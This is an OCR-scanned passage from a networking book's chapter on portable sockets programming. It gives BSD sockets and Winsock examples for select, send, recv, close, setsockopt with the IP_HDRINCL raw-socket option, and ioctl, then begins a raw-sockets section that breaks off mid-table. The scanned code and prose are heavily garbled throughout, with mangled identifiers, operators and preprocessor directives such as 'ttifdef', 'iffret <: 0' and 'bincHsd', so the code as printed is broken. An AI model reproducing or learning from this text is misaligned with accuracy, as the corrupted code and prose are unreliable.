BUF_LEN 
1024 
3 2 
3 3 
i n t 
3 4 
snain(void) 
3 5 
{ 
36 
#ifdef 
WIN32 
37 
WSADATA wsa; 
/* used by wsAStartupl) 
*/ 
38 
SOCKET 
sd = 0; 
3 9 
# e l s e 
4 0 
i n t 
sd = 0; 
4 1 
f t e n d i f 
42 
43 
s t r u c t sockaddr_in s i n 
; 
44 
s t r u c t timeval 
tv 
; 
/* r e q u i r e d for s e l e c t ! ) 
timeout 
*/ 
45 
fd_set 
f d s e t ; 
/• 
r e q u i r e d for s e l e c t ( ) 
f u n c t i o n * / 
46 
char 
ouf[BUF_LEN] : 
4 7 
i n t 
r e t = 0; 
48 
49 
/* must initialize winsock if on Win32 platform */ 
50 
flifdef 
WIN32 
51 
inemset (Swsa, 0x0, s i z e o f (WSADATA) ) ; 
52 
53 
if(WSAStartup[MAKEWORD<2, 
0 ) , iwsa) 
!= 0x0] 
54 
{ 
55 
printf("WSAStartuplI failed.\n"); 
56 
return(1) ; 

Chapter 7 • Portable Network Programming 
57 
} 
58 tendif 
59 
60 
/* create UDP socket */ 
61 
sd 
= socket [AF_INET, SOCK_DGRAM, 0) ; 
62 
/* if Win32, check for INVALID_SOCKET constant «/ 
63 
tifdef WIN32 
64 
if(Sd == INVALID_SOCKET) 
65 
/* otherwise, check for -1 */ 
66 
(telse 
67 
i£(sd 
< 01 
68 
ttendif 
69 
[ 
70 
printf("socket() 
failed.Vn"); 
71 
return(l); 
72 
} 
73 
74 
printf("socket descriptor created.\n"); 
75 
76 
/* bind socket to local port */ 
77 
78 
memset(&sinH 0x0, sizeof(sin)); 
79 
80 
s i n . s i n _ f a m i l y 
— AF_INET^ 
81 
82 
/* port to bind to */ 
83 
sin.sin_port 
= htons(LOCAL_PORT); 
84 
85 
/* make available via a l l interfaces */ 
86 
sin. sin_addr. s_addr 
= INADDRJNY; 
87 
88 
/* bind socket */ 
89 
ret = bincHsd, 
(struct sockaddr *) fcsin, sizeof(sin)) 
90 
ttifdef WIN32 
91 
i f l r a t == S0CKET_ERROR) 
92 
telse 
93 
iffret 
<: 0) 
94 
#endif 
95 
{ 
96 
printf("bind!) 
failed.\n-); 
97 
return(l); 
98 
} 
99 
100 
/* use select function to test when socket 
101 
descriptor is ready for reading */ 
102 
memset(Sfdset, 0x0, sizeof(fd_set)); 
103 
104 
FD_SET(sd, Sifdset) ; 
105 
106 
memset(&tv, GxG, sizeof(struct timeval)); 
107 
108 
tv.tv_sec = 5; 
109 
110 
/* the Winsock version of the select 
function 
111 
ignores the first argument, nfdsH so a value 
112 
of zero is passed to avoid compilation warning V 
113 ttifdef WIN32 

Portable Network Programming • Chapter 7 
297 
114 
ret = select [0, sfdset, MULL, NULL, &tv) ; 
115 
116 
/* the BSD sockets version of the select function 
1 17 
requires the nfds argument, so we provide it */ 
118 #else 
119 
120 
ret = selecttsd + 1, Sfdset, NULL, NULL, Sitv) ; 
121 #endif 
122 
123 
/* if Win32, check far SOCKET_ERROR value V 
124 iifdef WIN32 
125 
i f ( r e t == SOCKET_ERROR ) 
126 
/* otherwise, check for value less than zero */ 
127 #else 
128 
iffret 
•; 0) 
129 ttendif 
130 
( 
131 
printf("select() 
failed.\n"); 
132 
return(1); 
133 
} 
134 
/* if ret is zero, the tv.tv_sec timeout has passed */ 
135 
else if(ret == 0) 
136 
{ 
1 37 
printf("select!} 
timeout.\n")j 
138 
return(l) ; 
139 
) 
140 
141 
/* data ready for reading r. */ 
142 
143 
/* receive UDP datagram via recvO function */ 
144 
ret 
= recv 
(sd, [char «) but, BUF_LEN, 0); 
145 #ifdef WIN32 
146 
if [ret == SOCKET_ERROR( 
147 #else 
148 
i f l r e t 
< 0) 
149 #endif 
150 
{ 
151 
printf ("recv(J 
failed. \n") ; 
1 52 
return(1); 
153 
} 
154 
155 
printf ("recv okAn") ; 
156 
1 57 
return(O) ; 
158 } 
Analysis 
• 
At lines 44 and 45, the timeml and fd_set structures used by the select() function 
are declared. These structures are declared the same way on both Win32 and 
non-Win32 platforms. 
• 
At lines 102 through 108, variable initialization is performed before calling the 
select () function. 

298 
Chapter 7 • Portable Network Programming 
At lines 113 through 117, the selectQ function is called, with the first argument 
set to zero if the program is compiled on the Win32 platform. Note that the 
first argument is not used on the Win32 platform and is supported for cross-
platform-compatibility only. 
At line 120, the selectQ function is called with a non-zero valid for the first 
argunlent if the program is compiled on a non-Win32 platform. The select() 
function requires that the first argument is properly set when used on UNIX 
platforms. 
At lines 124 through 129, error checking is performed using if-dcf pre -com-
piler directives. 
^sendQ, sendtoO 
The UNIX signature and required header tiles for the send and sendto functions are: 
^include <sys/types.h> 
flinclude <sys/socket.h> 
int 
send 
(int 
int 
sendto 
(int 
const void 
size_t 
int 
const void 
size_t 
int 
const 
struct sockaddr 
socklen_t 
len 
a 
len 
*to 
*msg 
» 
flags) i 
*msg 
i 
flags, 
, 
tolen) 
*N|iRfss 
The Win32 signature and required header files for the send and sendto functions are: 
lifliiiMI 
#include <winsock2 . h> 
int 
send 
int 
sendto 
struct sockaddr FAR *to 
(SOCKET 
const char FAR 
int 
int 
(SOCKET 
const char FAR 
int 
Lnt 
const 
, 
int 
s 
, 
*buf 
s 
*buf 
, 
len „ 
flags); 
len 
flags, 
tolen} 
The scud and sendto functions are used to send data via a supplied socket descriptor 
and, in the case of the sendto function, a supplied destination address. 
The send function takes four arguments: the socket descriptor to be used in the send 
operation, the data to be sent, the length of the data to be sent, and an optional flag 

Portable Network Programming • Chapter 7 
299 
value. The seiidto function takes the same four arguments as the send function and two 
additional arguments: a sockaddv structure indicating the destination address where the 
data is to be sent and the length of the sockaddr structure. 
The BSD sockets and Wiiisock versions of the said and saidto functions are largely 
compatible. The only notable difference is the data type of the second argument. This 
value is defined as type const wid * for the BSD sockets function signature and as type 
const char FAR * for the Winsock function signature. Typecast this argument to const char 
* to ensure proper compilation using both APIs. 
Example 7.12 demonstrates the use of the said function to send data. Note that the 
data sent is cast to type char * to avoid compilation warnings on the Windows platform. 
1111111. Example 7.12 The sendtoQ Function (sendtol.c) 
2 
* sendtol.c 
3 * 
4 
* cross-platform compatible example of 
5 
* seiidto () function, send UDP datagram to 
6 
> port 1234 at address 127.0.0.1 
7 -f 
8 
9 
ttifdef WIN32 
10 
11 
/* r e q u i r e d for winsock */ 
1 2 
ttpragma 
comment(lib, 
- w s 2 _ 3 2 . l i b " ) 
13 
14 
# i n c l u d e <^winsock2Th> 
15 
16 
#else 
17 
18 
I* UNIX header files »/ 
1 9 
# i n c l u d e 
< s y s / t y p e s . h > 
20 
# i n c l u d e < s y s / s o c k e t . h> 
2 1 
# i n c l u d e 
< n e t i n e t / i n . h > 
22 
# i n c l u d e -carpa/inet. h> 
23 
2 4 
*endif 
25 
26 
# i n c l u d e < s t d i o , h > 
27 
28 
l* 
t a r g e t IP a d d r e s s & p o r t to connect to */ 
29 
#deflne TAROET_ADDR 
- 1 2 7 . 0 , 0 . 1 " 
30 
Sdefine TARGET_PORT 
1234 
31 
32 /* example data to send */ 
33 struct data 
34 { 
35 
int x; 
36 
int y; 
37 >; 
38 
39 int 
40 main (void) 
41 { 

Chapter 7 • Portable Network Programming 
42 #i£de£ WIN32 
43 
WSADATA wsa; 
/* used by wSAStartupO */ 
44 
SOCKET sd = 0; 
45 #else 
46 
int 
sd = 0; 
47 tendif 
48 
struct sockaddr_in sin ; 
50 
struct data 
data; 
51 
int 
ret = 0; 
52 
53 /* must initialize winsock if on Win32 platform */ 
54 ttifdef WIN32 
55 
memset(Swsa, 0x0, sizeof (WSADATA) I ; 
56 
57 
if (WSAStartup(MAKEWORD(2, 0) , &wsa) != 0x0) 
58 
{ 
59 
printf ("WSAStartupO failed.\n"); 
60 
return(l); 
61 
} 
62 #endif 
63 
64 
/* create UDP socket */ 
65 
sd 
= Socket(AF_INET, SOCK_DGRAM, 0); 
66 
/* if Win32, check for INVALID_SOCKET constant V 
67 #ifdef WIN32 
68 
if (Ed == INVALID_SOCKET) 
69 
/* otherwise, check for -1 V 
70 
#else 
71 
if(sd 
< 0) 
72 
#endi£ 
73 
( 
74 
printf("socket() failed,\n"J; 
75 
return(l) ; 
76 
i 
77 
78 
printf ("socket descriptor created. \ti"); 
79 
80 
/* define remote end-point */ 
81 
memsetl&sin, 0x0, sizeof(sin)); 
82 
S3 
sin rsin_family 
= AF_INET? 
84 
sin.sin_port 
= htons(TARGET_PORT); 
85 
sin.sin_addr.s_addr = inet_addr(TARGET_ADDR); 
86 
87 
ret 
= connect(sd, (struct sockaddr *) &sin, sizeof(sin)) ; 
88 #i£de£ WIN32 
89 
if(ret == S0CKET_ERRORI 
90 #else 
91 
if(ret < 0) 
92 tendif 
93 
{ 
94 
printf("connect() failed.\n"}; 
95 
return(l) ; 
96 
} 
97 
98 
/* send data using send function */ 

Portable Network Programming • Chapter 7 
99 
100 
101 
d a t a . x = 0 
d a t a ^ y B 0 
1 0 2 
/* c a s t p o i n t e r from type s t r u c t data * to c o n s t char * 
103 
to avoid compiler warnings w/ Visual S t u d i o */ 
104 
r e t 
= send(sd, 
(const char *) kdata, 
s i z e o f { d a t a ) , 
01; 
1 0 5 #ifdef 
WIN32 
1 0 6 
i f l r e t — SOCKET_ERROR( 
1 0 7 # e l s e 
1 0 8 
i f ( r e t 
1 0 9 #endif 
1 1 0 
( 
111 
1 1 2 
1 1 3 
> 
114 
1 1 5 
p r i n t f ( 
1 1 6 
< 0) 
p r i n t f (* serial I 
f a i l e d . \ n " ) ; 
r e t u r n ( l ) ; 
"data s e n t . \n"l ; 
1 1 7 
return(O) ; 
118 ) 
Analysis 
At lines 32 through 37, a sample data structure is defined. A variable of this 
type is sent using the scudQ function at line 104. This data structure is used as 
an example only. 
At line 104, the sample data structure is sent using the sendQ function.The 
pointer that is passed to the sendQ function is explicitly cast to type (const cha r 
*). This is done to prevent compiler warnings when using the Microsoft Visual 
Studio.NET development environment. GCC does not give this same warning 
on the UNIX platform. 
At lines 105 through 108, error checking is performed using ij-def precom-
piler directives. 
recvQ, recvfromO 
i-'i'i" The UNIX signature and required header files for the rccv and recvfrom functions are: 
#include <sys/types.h> 
^include -csys/socket .h> 
int 
Lnt 
recv 
recvfroin {int 
( i n t 
void 
s i z e _ t 
I IL L 
v o i d 
1 • •:. 
Int 
s t r u c t 
soc 
s o c k l e n _ t 
3 
kaddr 
3 
*buf 
l e n 
flags 
) 
*buf 
; en 
flags 
H 
*from 
+fromlen) 

302 
Chapter 7 • Portable Network Programming 
'"E"5" The Win32 signature and required header tiles for the recv and recvfrom functions are: 
^^^^^ 
#include <winsock2.h* 
int 
recv 
(SOCKET 
s 
, 
char FAR 
*buf 
int 
len 
, 
int 
flags 
I; 
int 
recvfrom (SOCKET 
s 
char FAR 
"buf 
, 
int 
len 
int 
flags 
struct scckaddr FAR *from 
int FAR 
*fromlen) ; 
The recv and recvfrom functions are used to receive data via a socket descriptor. The 
recv function takes four arguments: the socket descriptor from which data is to be 
received, the buffer in which to store received data, the length of the buffer, and an 
optional flag value. 
The recvfrom function takes the same four arguments as the recv function plus two 
additional arguments: a sockaddr structure where the source address of the host from 
which data is received is stored, and the length of the sockaddr structure.This function is 
normally used to receive UDP datagrams and in conjunction with raw sockets to receive 
IPv4 datagrams. 
The BSD sockets and Winsock versions of the recv and recvfrom functions are largely 
compatible. The only notable difference is the data type of the second argument. This 
value is defined as type void * for the BSD sockets function signature, and as type char 
FAR * for the Winsock function signature. Typecast this argument to char * to ensure 
proper compilation using both APIs. 
Example 7.13 demonstrates the use of the recvfrom function to recv data. Note that 
the buffer used to store received data is cast to type char * to avoid compilation warnings 
on the Windows platform. 
'"!,..^ Example 7.13 The recvQ Function (recW.c) 
1 /• 
2 
* recvl.c 
3 * 
4 
* cross-platform compatible example of 
5 
* recv() function. 
6 
V 
7 
S 
ttifdef WIN32 
9 
10 
/* required for winsock */ 
11 ttpragma comment(lib, 
-ws2_32.1ib-) 
12 
13 ^include <winsock2 . h^ 
14 
15 Kelse 
16 
17 
/* UNIX header files »/ 

Portable Network Programming • Chapter 7 
303 
18 
# i n c l u d e 
< s y s / t y p e s . h > 
1 9 
# i n c l u d e 
<sys/socket-h> 
2 0 
^ i n c l u d e 
< n e t i r t e t / i n . h > 
21 
22 
#endif 
23 
24 #include <stdioTh> 
25 
26 
/* 
l o c a l p o r t to bind to 
V 
27 
#deflne 
LOCAL_P0RT 
1234 
28 
29 
/* 
r e c e i v e buffer l e n g t h */ 
30 
#deflne 
BUF_LEN 
1024 
31 
32 
int 
33 
main(void) 
34 i 
3 5 
#ifdef 
WIN32 
36 
WSADATA wsa; 
/* 
used by wSAStartupl) 
*/ 
37 
SOCKET 
sd = 0; 
3 8 
# e l s e 
3 9 
i n t 
sd = 0; 
4 0 
#endif 
4 1 
42 
s t r u c t SOCkaddr_in s i n 
; 
43 
char 
buf[BUF_LEN]; 
4 4 
i n t 
r e t = 0; 
45 
46 
/* must initialize winsock if on Win32 platform */ 
47 
#ifdef WIN32 
48 
ntemset (&wsa, 0x0, sizeof (WSADATA) ) ; 
49 
50 
if<WSAStartup[MAKEWORD<2, 0 ) , &wsa) 
! = 0x0) 
51 
{ 
5 2 
printf!"WSAStartupl) 
f a i l e d . \ n " ) ; 
5 3 
r e t u r n ( l ) ; 
5 4 
) 
5 5 t t e n d i f 
5 6 
57 
/* c r e a t e UDP socket */ 
58 
Sd 
= SOCket (AF_1NET, SOCK_DGRAM, 0 ) ; 
59 
/* 
if Win32, 
check for INVALID_SOCKET c o n s t a n t */ 
60 
#i£def WIN32 
61 
i f ( s d == INVAL1D_S0CKET) 
62 
/* otherwi s e , 
check for -1 */ 
6 3 
# e l s e 
64 
i f ( s d 
< 0) 
6 5 
#endif 
66 
{ 
6 7 
p r i n t f ( " s o c k e t O 
f a i l e d . \ n " ) ; 
68 
r e t u r n ( 1 ) ; 
69 
} 
70 
71 
printf("socket descriptor created.\n"); 
72 
73 
/* bind socket to local port */ 
74 
7 5 
m e m s e t ( i s i n , 
0x0, 
s i z e o f ( s i n ) ) ; 

304 
Chapter 7 • Portable Network Programming 
76 
77 
s i n . s i n _ f s m i l y 
= AF_INET7 
78 
79 
/* port to bind to V 
80 
sin.sin_port 
= htons(LOCflL_P0RTJ; 
81 
82 
/* make available via all interfaces */ 
83 
sin.sirt_addr.s_addr 
= INADDR_ANY; 
84 
85 
/* bind socket */ 
86 
ret = bind(sd, 
(struct sockaddr *) &sin, sizeof(sin)) ; 
87 
ttifdef WIN32 
88 
i f ( r e t == S0CKET_ERR0R) 
89 
ffelse 
90 
iffret 
<: 0) 
91 
ttendif 
92 
( 
93 
printf ("bindO 
failed.\n"(; 
94 
return(l); 
95 
} 
96 
97 
printf(•waiting for intput.\n"}; 
98 
99 
/* receive UEP datagram via recv() function V 
100 
ret 
= recv (sd, (char *) buf, BUF_LEN, 0); 
101 Jfifdef WIN32 
102 
i f ( r e t == S0CKET_ERRORI 
103 telse 
104 
i f ( r e t 
< 0) 
105 tendif 
106 
( 
107 
printf("recv() 
failed. \n") ; 
108 
r e t u r n d ) ; 
109 
J 
110 
111 
printf(*recv ok.\n")# 
112 
113 
returnlO) ; 
114 } 
Analysis 
At line 100, the recvQ function is used to recvQ data from a UDP socket.The 
buffer to be used to store received data is explicitly cast to type (char *) to 
avoid compiler warnings when using the Microsoft Visual Studo.NET devel-
opment environment. GCC does not give this warning on the UNIX plat-
form. 
At lines 101 through 104, error checking is performed using if-def pre -com-
piler directives. 

Portable Network Programming • Chapter 7 
305 
CloseQ, ClosesocketO 
|s«N(i«ES5 The UNIX close function signature and required header files are: 
••••iiill 
#include <unistd,h> 
int 
close 
(iric d ); 
:"™jj* = " The Win32 function signature and required header files are: 
#include <winsock2.h> 
int 
closesocket[SOCKET sir 
The UNIX close system call and the Winsock dosesocket function are used to close a 
previously opened socket descriptor. 
On the UNIX platform, socket descriptors are treated like any other type of 
Input/Output (I/O) descriptor. As such, the standard close system call can be used to 
close socket descriptors. Winsock does not treat socket descriptors as file descriptors.The 
Winsock-specific dosesocket function must be used to close socket descriptors.The best 
means for handling this difference when writing portable code is to use ifcief pre-com-
piler directives to conditionally call close or dosesocket depending on the platform that 
the code is compiled on. 
Note that the Windows standard C library does define the doscQ function, but it 
cannot be used to close a socket descriptor. Example 7.14 demonstrates use of the doseQ 
and dosesocket functions to close a socket descriptor. 
_ _ _ _ Example 7.14 The c/osef) Function (doselx) 
mmmm 
^ 
^ 
2 
* closel,c 
3 
* 
4 
* cross-platform 
compatible 
example 
5 
* of close 0 /dosesocket {) functions. 
6 
• / 
7 
8 
#i£def WIN32 
9 
10 
f* recfuired for winsock */ 
11 
#pragma commentllib, "ws2_32.lib") 
12 
1 3 
#include -cwinsock2 . h> 
14 
1 5 ttelse 
16 
17 #include <sys/types.h> 
18 #include <sys/socket,h> 
19 #include <unistd.h> 
20 
21 
#endif 
22 
23 
#include <stdio,h> 
24 
25 
int 

306 
Chapter 7 • Portable Network Programming 
26 
main(void) 
27 
f 
28 
ttifdef 
WIN32 
29 
WSADATA wsa; 
/* r e q u i r e d for WSAStartupO 
*/ 
30 
SOCKET 
sd = 0; 
31 
Belse 
3 2 
i n t 
sd = 0; 
33 
ttendif 
34 
35 
/* i n i t i a l i z e wiiisock if on Win32 
*/ 
36 
#ifdef 
WIN32 
37 
memset(iwsa, 0x0 H s i z e o f ( W S A D A T A ) ) ; 
38 
39 
if (WSAStartup(MAKEWORD(2, 0 ) , &wsal 
1 = 0x0) 
4 0 
t 
41 
printf("WSAStartupl) 
f a i l e d . \ n " > ; 
4 2 
r e t u r n ( l ) ; 
4 3 
} 
4 4 
t e n d i f 
45 
4 6 
/ * 
c r e a t e socket d e s c r i p t o r * / 
47 
sd = socket[AF_INET, 
SOCK_STREAM, 
0 ) ; 
48 
/* 
if Win32, 
cheek for INVALID_SOCKET */ 
49 
ttifdef 
WIN32 
50 
i f ( S d == INVALID_SOCKET) 
51 
telse 
/* otherwise, check for return val < 0 */ 
53 
i f ( s d 
< 0) 
5 4 
t e n d i f 
5 5 
{ 
56 
p r i n t f ( " s o c k e t ( ) 
f a i l e d . \ n " ) ; 
5 7 
r e t u r n ( l ) ; 
58 
} 
59 
60 
/* close socket! */ 
61 tifdef WIN32 
62 
/* Win32 specific closesocket call */ 
63 
closesocket(sd); 
64 tteise 
6 5 
/ * UNIX c l o s e d 
system c a l l * / 
6 6 
c l o s e ( s d ) ; 
67 
# endi f 
6 8 
69 
return(O) ; 
7 0 
} 
Analysis 
At lines 61 through 64, the Winsock variant of the closeQ function, dosesocketQ, 
is called to close a previously opened socket descriptor. Note that the closeQ 
function does exist on the Win32 platform but cannot be used to close a 
socket descriptor. 
At line 66, the closeQ function is used to close a previously opened socket 
descriptor if the program is compiled on a non-Win32 platform. 

Portable Network Programming • Chapter 7 
307 
setsockoptO 
Lxfc.Esi The UNIX setsockopt function signature and required header files are: 
UiiiiiiiiiH 
#include <sys/types.h> 
ttinclude <sys/socket,h> 
int 
setsockopt {int 
s 
int 
level 
, 
i n t 
optname, 
const void *optval , 
socklen_t 
optlen ); 
The Win32 setsockopt function signature and required header files are: 
#include <:winsock2.h:> 
int 
setsockopt [SOCKET 
s 
, 
int 
level 
, 
int 
optname, 
const char FAR * optval H 
int 
optlen ) ; 
The setsockopt function is used to set socket options for a previously created socket 
descriptor.The function takes five arguments: the socket descriptor for which the option 
is to be set, the protocol level at which the option is to be set, the option name , a 
pointer to the values required for the option, and the length of the values supplied. 
The setsockopt function is typically used to set options for non-raw TCP or UDP 
sockets. For raw sockets, the function is typically used to set the 1P_HDRINCL option 
to enable inclusion of custom IPv4 headers in packets to be sent. 
The BSD sockets and Winsock versions of the setsockopt function are mostly com-
patible. The only notable difference is the type specified for the optval argument.The 
BSD sockets function signature specifies the optval argument as type const void * while 
the Winsock function signature specifies the optval argument as type const char FAR *, 
Typecast this argument to const char * to ensure proper compilation using both APIs. 
Example 7.15 demonstrates use of the setsockopt function to set the IP_fIDRlI\rCL 
socket option on a raw socket descriptor. Note that the optval argument is east to type 
const char * at line 7(1. 
Example 7.15 The setsockoptO Function {setsockoptl.c) 
1 f* 
2 
* setsockopt1.c 
3 -
4 
* cross-platform compatible example of 
5 
* TCP raw socket creation and use of 
6 
* setsockopt function to set IP_HDRINCL 
7 
* option. 
8 */ 
9 
10 #ifdef WIN32 
11 
12 
f* required for winsock */ 
1 3 #pragma comment (lib> "ws2_32 . lib") 

Chapter 7 • Portable Network Programming 
14 
15 
(include <winsock2.h> 
16 
(include <ws2tcpip.hs /* required for IP_HDRIKCL option */ 
17 
18 telse 
19 
20 
/* UNIX header flies */ 
21 
(include <sys/types,h> 
22 
ftinclude 
<sys/socket,h> 
23 
ftinclude 
<netinet/in.h:> 
24 
25 
tendif 
26 
27 
ftinclude 
<stdio.h> 
28 
29 int 
30 main(void) 
31 ( 
32 fifdef Win32 
33 
WSADATA wsa; 
/* used by WSAStartupO */ 
34 
SOCKET sd = 0; 
35 (else 
36 
int 
sd = 0 ; 
37 tendif 
38 
39 
int 
fig = 1; 
40 
int 
ret = 0; 
41 
42 /* must initialize winsock if on Win32 platform */ 
43 tifdef WIN32 
44 
memsetI&wsa, 0x0, sizeof (WSADATA) ) ; 
45 
46 
if (WSAStartup(MAKEWORD(2, 0) , JiwsaJ != 0x0) 
47 
( 
48 
printf ("WSAStartupO 
failed. \n"); 
49 
return(l) ; 
50 
} 
51 
tendif 
52 
53 
/* create TCP raw socket */ 
54 
sd 
= socket(AF_INET, 
SOCK_RAW, IPFROTO_TCPJ; 
55 
/* if Win32, check for INVALID_SOCKET constant */ 
56 
tifdef WIN32 
57 
iffsd == INVALID_SOCKET) 
58 
/* otherwise, check for -1 V 
59 telse 
60 
iftsd < 01 
61 tendif 
62 
( 
63 
printf ("socket () failed An" J ; 
64 
return(1); 
65 
} 
66 
67 
orint:("socket descriptor created.\n"); 
68 
69 
ret 
= setsockopt(sd, IPPR0TO_IP, IP_HDRINCL, 
70 
(const char *) &flg, sizeof (fig) J ; 

Portable Network Programming • Chapter 7 
309 
71 
/* if Win32, check for SOCKET_ERROR constant *./ 
72 
rtifdef 
WIN32 
73 
if(ret = SOCKET_ERR0R) 
74 
l* otherwise, check for -1 */ 
75 
#else 
76 
if (ret < 0) 
77 
ftendif 
78 
{ 
79 
printf("setsockoptlI failed.\n"); 
80 
return(l); 
81 
> 
82 
83 
princf CIP_HDRIWCL socket option set.\n"J; 
84 
85 
86 ] 
Analysis 
• 
At line 16, the ws2tcpip.h header file is included if the program is compiled on 
the Win32 platform. This header file is required if the setsockoptQ function is to 
be used. 
• 
At lines 69 and 70, the sctsockoptQ function is called.The fourth argument, ffy, is 
explicitly cast to type (const char *) to avoid compiler warnings when using the 
Microsoft Visual Studo.NET development environment. 
• 
At lines 72 through 76, error checking is performed using if- def pre -compiler 
directives. 
loctlQ, loctlsocketO 
4BES5 The UNIX iotd function signature and required header files are: 
jgjJMBI 
#include <sys/ioctl.h> 
int 
ioctl 
lint 
d 
, 
unsigned long 
request, 
); 
' t " " 
The Win32 iocthocket function signature and required header files are: 
• ^ ^ ^ ^ 
#include <:winsock2.h> 
int 
ioctlsocket 
(SOCKET 
long 
u_long FAR 
s 
, 
cmd 
*argp 
The UNIX iocti system call and the Winsock iocthocket functions are used to modify 
the input and output characteristics of a socket descriptor. 
The UNIX iocti system call takes a minimum of two arguments while the Winsock 
iocthocket function takes exactly three arguments. For both the UNIX iocti system call 
and the Winsock iocthocket function, the first argument is the socket descriptor to be 

310 
Chapter 7 • Portable Network Programming 
operated on.The second argument is a long integer value indicating the requested I / O 
control operation to be performed. For the U N I X iocil system calls remaining argu-
ments, a variable list of arguments can be passed together with the ioctl request. For the 
Winsock ioctlsockct function s third argument, a single unsigned long pointer is expected. 
The ioctl system call and iocthockct functions are frequently used with socket descrip-
tors to set the I / O mode to non-blocking. Using Winsock, the ioctisocfcct function is also 
useful for setting the Winsock-specific SIO_RCVALL I / O mode on raw sockets to 
receive all IPv4 traffic sent to the system. 
Example 7.16 demonstrates use of the ioctl and iocttsocket functions to set the I/O 
mode of a socket descriptor to non-blocking. 
<"•*'•" Example 7.16 The ioctlQ Function (ioctll.c) 
'• 
i 
/ 
* 
2 
* i o c t l l . c 
3 
-
4 
* cross-platform example of 
5 
* ioctll)/ioctlsocket() functions. 
6 
V 
7 
8 
tlifdef WIN32 
9 
10 
/* 
r e q u i r e d for winsock 
V 
11 
tfpragma 
comment ( l i b , 
"ws2_32.1ib"} 
12 
13 
# i n c l u d e <;winsock2 . h> 
14 
15 
telse 
16 
17 
/* UNIX header files */ 
18 
# i n c l u d e <=sya/ types .b> 
19 
# i n c l u d e 
<sys/socket.h> 
20 
21 
/* r e q u i r e d for i o c t l O 
*/ 
22 
# i n c l u d e <;sy&y i o c t l + h> 
23 
24 
tendif 
25 
26 
# i n c l u d e < s t d i o . h > 
27 
28 
int 
29 
main(void) 
30 ( 
31 
t i f d e f 
WIN32 
32 
WSADATA 
wsa; 
33 
SOCKET 
3d 
= 0; 
34 
unsigned long v a l = 1; 
35 
tfelse 
3 6 
i n t 
sd 
= 0 ; 
37 
long 
v a l • 1; 
3 8 
i e n d i f 
3 9 
4 0 
int 
r e t = 0; 
41 
42 /* must initialize winsock if on Win32 platform */ 
/* used by WSAStartupU */ 
/* used for ioctlsocket() */ 
/* used for ioctl() * / 
/* ioctl/ioctlsccket return val 

Portable Network Programming • Chapter 7 
311 
43 
ttifdef 
WIN32 
44 
memset(fcwsa, 
0x0, 
sizeof(WSADATA)); 
45 
46 
if(WSAStartup[HAKEWORD<2, 0 ) , &wsa) 
! = 0x0) 
47 
{ 
48 
p r i n t f ("WSAStartupn 
f a i l e d . \n") ; 
49 
r e t u m ( l ) ; 
5 0 
} 
51 
#endif 
52 
53 
/* c r e a t e TCP socket */ 
54 
Sd 
= SOCket (AF_INET, SOCK_STREAM, 
0 ) ; 
55 
/* if Win32, check for IHVALID_SOCKET constant */ 
56 #ifdef WIN32 
57 
i£(sd == INVALID_SOCKET) 
58 
/* o t h e r w i s e , 
check for -1 */ 
59 
ttelse 
60 
i f ( s d 
< 0) 
61 
Sendif 
62 
{ 
6 3 
p r i n t f ( " s o c k e t { ) 
f a i l e d . \ n " ) ; 
64 
r e t u r n (1) ; 
6 5 
} 
6 6 
67 
printf("socket descriptor created.\n-(; 
68 
69 
ttifdef 
WIN32 
70 
r e t 
= i o c t i s o c k e t ( s d , FIONBIO, &val); 
71 
i f f r e t == SOCKET_ERROR) 
7 2 
f t e l s e 
73 
ret 
= ioctl(sd, FIONBIO, 5=val); 
74 
iffret •; 01 
75 #endif 
76 
{ 
77 
p r i n t f r i o c t l 
FIONBIO 
f a i l e d . \ n " ) ; 
78 
r e t u r n ( 1 ) ; 
79 
) 
80 
81 
p r i n t f ( " i o c t l 
FIONBIO s e t . V n " ) ; 
82 
8 3 
r e t u r n ( O ) ; 
84 > 
Analysis 
At line 34, die v.triable r,i! is declared as type unsigned long. l\w. is done to pre-
vent compiler 'warnings when using the Microsoft Visual Studio.NET develop-
ment environment, 
At line 37, the variable ml is declared as type long and is signed.This is the type 
expected by the ioctlQ function when the program is compiled on a non-
Win32 platform. 
At lines 60 and 70, the Winsock variant of the ioctl() function, ioctlsocketQ, is 
called if the program is compiled on the Win32 platform. This function has 

312 
Chapter 7 • Portable Network Programming 
almost the same function signature as its UNIX counterpart, but takes an 
unsigned long for its third argument instead of a signed Ion. 
• 
At line 73 the ioctlQ function is called if the program is compiled on a non-
Win32 platform. 
Raw Sockets 
Raw sockets are a special type of socket that can be used to send and receive network 
traffic at the network and transport layers of the TCP stack model, including custom IP, 
Internet Control Message Protocol (ICMP).TCP, and UDP traffic. 
This section details portability issues related to raw sockets programming using the 
BSD sockets and Winsock programming interfaces.The topics covered include the 
sockets API used for raw sockets programming, commonly used header files, and 
methods for determining the local IP address to use when constructing IPv4 datagrams. 
Note that the Microsoft Windows'JS line of operating systems and the Microsoft 
WindowsNT 4.0 operating system do not provide full raw sockets support, while the 
Microsoft Windows2000, XP, and 2003 operating systems do.The information and 
examples in this section pertain primarily to those operating systems with full raw 
sockets support. 
API Overview 
The BSD sockets and Winsock APIs both provide support for raw sockets programming. 
Raw sockets support is made available via the same set of functions as used for normal 
non-raw sockets programming. Use of these functions for raw sockets programming 
requires handling of portability issues as discussed in the "BSD Sockets and Winsock" 
section. 
Raw sockets programming differs from normal non-raw sockets programming in 
that low-level protocol headers are used to construct data to send or to process data that 
is received. Most UNIX systems provide header files that define common protocol 
headers such as the IPv4, ICMP, UDP, and TCP headers. The Winsock API and header 
files do not define these protocol headers. As such, they must be defined manually by the 
programmer when using the Winsock API. 
Additionally, when constructing IPv4, UDP, orTCP protocol headers, it is necessary 
to obtain the local IP address that the datagram will originate in order to either com-
plete the source IP address field of an IPv4 protocol header or to compute the UDP or 
TCP header checksum value. There is no cross-platform-compatible standard for 
obtaining the proper local IP address to be used for a particular destination IP address. 
The following two sections detail how to construct cross-platform-compatible 
header files and various methods for obtaining local IP address values. 
Header Files 
Many of the functions and constants used in raw sockets programming are defined in a 
variety of header files on the UNIX and Windows platforms. Table 7.1 lists the most 

Portable Network Programming • Chapter 7 
313 
common functions and constants and the header files in which they are located on the 
OpenBSD and Microsoft Windows platforms. 
Table 7.1 Header Files for Socket-related Functions and Constants 
Name 
Socket 
Setsockopt 
loctl 
loctlsocket 
send, sendto 
Recv, recvfrom 
Close 
Closesocket 
IPPROTOJP 
IPPROTOJCMP 
IPPROTO_UDP 
IPPROTOJCP 
FIONBIO 
IP_HDRINCL 
SIO_RCVALL 
Type 
Function 
Function 
Function 
Function 
Function 
Function 
Function 
Function 
Constant 
Constant 
Constant 
Constant 
Constant 
Constant 
Constant 
UNIX Header File 
sysi socket.h 
